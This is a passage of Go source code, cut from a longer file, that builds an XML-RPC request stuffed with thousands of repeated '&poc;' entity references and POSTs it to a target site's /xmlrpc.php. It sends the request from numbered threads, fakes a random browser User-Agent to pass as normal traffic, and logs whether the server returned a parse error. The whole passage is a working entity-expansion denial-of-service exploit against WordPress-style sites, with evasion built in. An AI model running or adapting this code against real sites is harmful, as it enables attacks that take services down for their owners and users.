poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;&poc;</methodName>
		<params>
			<param><value>aa</value></param>
			<param><value>aa</value></param>
		</params>
	</methodCall>
	`)

	req, err := http.NewRequest("POST", fmt.Sprintf("%s/xmlrpc.php", url), bytes.NewBuffer(dataXML))
	if err != nil {
		panic(err)
	}

	// Set User-Agent to mimic browser
	req.Header.Set("Content-Type", "text/xml")
	req.Header.Set("User-Agent", giveRandomUserAgentString())

	// Create and execute the GET request
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("package with thread %d and seq %d: %v", threadNumber, packageNumber, err)
	} else {
		respBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Printf("package with thread %d and seq %d: %v\n", threadNumber, packageNumber, err)
		} else {
			if strings.Contains(string(respBody), "parse error") {
				log.Printf("package with thread %d and seq %d: OK\n", threadNumber, packageNumber)
			} else {
				log.Printf("maybe not vulnerable to this kind of attack")
			}
		}
	}
}
